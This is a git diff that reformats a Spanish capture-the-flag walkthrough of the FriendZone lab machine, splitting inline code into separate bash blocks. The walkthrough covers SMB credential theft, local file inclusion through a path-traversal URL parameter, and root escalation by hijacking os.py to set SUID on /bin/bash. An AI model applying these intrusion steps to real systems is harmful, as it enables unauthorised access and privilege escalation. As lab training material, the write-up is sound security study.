@@ -69,7 +69,15 @@ Login failed
 openssl s_client -connect 10.10.10.123:443
 ```
 
-Aqui vemos un un correo `haha@friendzone.red`. Añadimos el dominio friendzone.red al `/etc/hosts`.
+Aqui vemos un un correo 
+```bash
+ haha@friendzone.red 
+```
+. Añadimos el dominio friendzone.red al 
+```bash
+ /etc/hosts 
+```
+.
 
 ### Analyzando la web {-}
 
@@ -79,15 +87,47 @@ Aqui vemos un un correo `haha@friendzone.red`. Añadimos el dominio friendzone.r
 whatweb http://10.10.10.123
 ```
 
-Es un Apache 2.4.29 en un Ubuntu y podemos ver un nuevo dominio `friendzoneportal.red` que añadimos al `/etc/hosts`. 
+Es un Apache 2.4.29 en un Ubuntu y podemos ver un nuevo dominio 
+```bash
+ friendzoneportal.red 
+```
+ que añadimos al 
+```bash
+ /etc/hosts 
+```
+. 
 
 
 #### Checkear la web {-}
 
-Si entramos en la url `https://10.10.10.123`, No vemos gran cosas. 
-Si vamos por la url `https://friendzone.red` vemos una nueva web, mirando el codigo fuente, vemos un comentario sobre un directorio
-`/js/js` y si vamos por la url `https://friendzone.red/js/js` vemos una especie de hash en base64 que intentamos romper con el comando
-`echo "MTZaVFhRMDBrSTE2MzUxMDgwMzRieUxPVHlmdGkz" | base64 -d | base64 -d` pero no nos da gran cosa. Si miramos la url `https://friendzoneportal.red`,
+Si entramos en la url 
+```bash
+ https://10.10.10.123 
+```
+, No vemos gran cosas. 
+Si vamos por la url 
+```bash
+ https://friendzone.red 
+```
+ vemos una nueva web, mirando el codigo fuente, vemos un comentario sobre un directorio
+
+```bash
+ /js/js 
+```
+ y si vamos por la url 
+```bash
+ https://friendzone.red/js/js 
+```
+ vemos una especie de hash en base64 que intentamos romper con el comando
+
+```bash
+ echo "MTZaVFhRMDBrSTE2MzUxMDgwMzRieUxPVHlmdGkz" | base64 -d | base64 -d 
+```
+ pero no nos da gran cosa. Si miramos la url 
+```bash
+ https://friendzoneportal.red 
+```
+,
 vemos otra imagen pero tampoco vemos gran cosa en este caso.
 
 
@@ -114,7 +154,15 @@ Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos
 smbmap -H 10.10.10.123
 ```
 
-y vemos que denemos accesso con derecho de lectura al directorio `general` y derechos de lectura y escritura al directorio `development`.
+y vemos que denemos accesso con derecho de lectura al directorio 
+```bash
+ general 
+```
+ y derechos de lectura y escritura al directorio 
+```bash
+ development 
+```
+.
 Vamos a conectarnos para ver lo que hay por estos registros
 
 ```bash
@@ -122,9 +170,17 @@ smbclient //10.10.10.123/general -N
 dir
 ```
 
-Vemos un fichero creds.txt y nos lo descargamos con el commando `get creds.txt`. 
+Vemos un fichero creds.txt y nos lo descargamos con el commando 
+```bash
+ get creds.txt 
+```
+. 
 
-Miramos si nos podemos conectar con `ssh admin@10.10.10.123` pero no podemos y miramos si tenemos accesso a mas registros.
+Miramos si nos podemos conectar con 
+```bash
+ ssh admin@10.10.10.123 
+```
+ pero no podemos y miramos si tenemos accesso a mas registros.
 
 ```bash
 smbmap -H 10.10.10.123 -u 'admin' -p 'WORKWORKHhallelujah@#'
@@ -145,18 +201,46 @@ El ataque de transferencia de zone nos permite ver una serie de subdominios como
 - hr.friendzone.red
 - uploads.friendzone.red
 
-los introducimos en el `/etc/hosts` y lo analyzamos en firefox.
+los introducimos en el 
+```bash
+ /etc/hosts 
+```
+ y lo analyzamos en firefox.
 
 ### Checkeamos los nuevos dominios {-}
 
-Podemos ver que el `https://hr.friendzone.red` no nos muestra nada.
-La url `https://uploads.friendzone.red` nos envia a una pagina donde podemos uploadear imagenes y la url
-`https://administrator1.friendzone.red` nos muestra un panel de inicio de session.
+Podemos ver que el 
+```bash
+ https://hr.friendzone.red 
+```
+ no nos muestra nada.
+La url 
+```bash
+ https://uploads.friendzone.red 
+```
+ nos envia a una pagina donde podemos uploadear imagenes y la url
+
+```bash
+ https://administrator1.friendzone.red 
+```
+ nos muestra un panel de inicio de session.
 
 Como hemos encontrado credenciales con smb, intentamos conectarnos desde el panel de inicio de session y estas credenciales son validas.
 
-Aqui vemos que existe un fichero `dashboard.php`. Si vamos a la url `https://administrator1.friendzone.red/dashboard.php`, tenemos un mensaje que
-dice que el falta el parametro image_name y que por defecto, necesitamos poner `image_id=a&pagename=timestamp`. Intentamos la url siguiente:
+Aqui vemos que existe un fichero 
+```bash
+ dashboard.php 
+```
+. Si vamos a la url 
+```bash
+ https://administrator1.friendzone.red/dashboard.php 
+```
+, tenemos un mensaje que
+dice que el falta el parametro image_name y que por defecto, necesitamos poner 
+```bash
+ image_id=a&pagename=timestamp 
+```
+. Intentamos la url siguiente:
 
 ```bash
 https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=timestamp
@@ -174,7 +258,19 @@ https://administrator1.friendzone.red/dashboard.php?image_id=a&pagename=/../../.
 ```
 
 Aqui hemos constatado que podemos injectar una pagina de la web en esta misma pagina y que no se necessita poner la extension que la pagina añade
-`.php` por si sola. Es por esto que no se puede ver el `/etc/passwd` porque añade un `.php` al final.
+
+```bash
+ .php 
+```
+ por si sola. Es por esto que no se puede ver el 
+```bash
+ /etc/passwd 
+```
+ porque añade un 
+```bash
+ .php 
+```
+ al final.
 
 
 
@@ -185,8 +281,20 @@ Aqui hemos constatado que podemos injectar una pagina de la web en esta misma pa
 
 Cuando hemos mirado los registros compartidos a nivel de red con smbmap, hemos constatado que teniamos derechos de lectura
 y de escritura al registro Development. Y esta enumeracion nos a monstrado que el registro Files esta bindeada al directorio
-`/etc/Files`. Esto no hace pensar que si subimos ficheros al registro `Development`, puede que sea finalmente bindeada al directorio 
-`/etc/Development`. 
+
+```bash
+ /etc/Files 
+```
+. Esto no hace pensar que si subimos ficheros al registro 
+```bash
+ Development 
+```
+, puede que sea finalmente bindeada al directorio 
+
+```bash
+ /etc/Development 
+```
+. 
 
 1. Creamos un fichero php de prueba
 
@@ -342,7 +450,11 @@ ls -l
 cat mysql_data.conf
 ```
 
-Vemos la contraseña del usuario friend y nos podemos convertir con el comando `su friend` y leer la flag.
+Vemos la contraseña del usuario friend y nos podemos convertir con el comando 
+```bash
+ su friend 
+```
+ y leer la flag.
 ## Privilege Escalation {-}
 
 ### Rootear la maquina {-}
@@ -395,9 +507,17 @@ Vemos que el script no hace nada en concreto. Solo importa la libreria os y alma
     print sys.path
     ```
 
-    Aqui vemos que busca primeramente en el directorio actual de trabajo y despues en `/usr/lib/python2.7/sys.py`
+    Aqui vemos que busca primeramente en el directorio actual de trabajo y despues en 
+```bash
+ /usr/lib/python2.7/sys.py 
+```
 
-1. Miramos nuestros derechos en la carpeta `/usr/lib/python2.7`
+
+1. Miramos nuestros derechos en la carpeta 
+```bash
+ /usr/lib/python2.7 
+```
+
 
     ```bash
     locate os.py
@@ -425,7 +545,11 @@ Vemos que el script no hace nada en concreto. Solo importa la libreria os y alma
     watch -n 1 ls -l /bin/bash
     ```
 
-Vemos que aparece un `s` en la /bin/bash
+Vemos que aparece un 
+```bash
+ s 
+```
+ en la /bin/bash
 
 ```bash
 bash -p
